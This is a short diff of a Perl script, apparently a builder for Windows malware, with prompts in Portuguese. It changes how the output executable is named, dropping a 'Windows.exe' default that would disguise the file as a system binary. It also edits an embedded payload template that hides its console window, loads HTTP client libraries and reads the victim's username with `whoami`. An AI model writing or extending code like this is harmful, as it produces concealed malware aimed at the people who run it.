@@ -57,8 +57,7 @@ if($website){
 		if($executable_name){
 		  chomp $executable_name;
 		  if(! $executable_name){
-		    $executable_name = "Windows.exe";
-			print color("RED"),"\n[*]",color("reset"), " Nome definido como Windows.exe...\n";
+		    print color("RED"),"\n[*]",color("reset"), " Nome do malware indefinido !\n";
 		  }
 		  else{
 		    $executable_name .= ".exe" if $executable_name !~ /\.exe$/;
@@ -72,8 +71,6 @@ hide_console();
 use LWP::UserAgent;
 use LWP::Simple;
 use Config;
-use warnings;
-use strict;
 
 my (\$username, \$response, \$agent, \$name, \$ok) = `whoami`, undef, undef, undef, 0;
 \$username =~ s/(.*?)\\\\(.*?)//g;
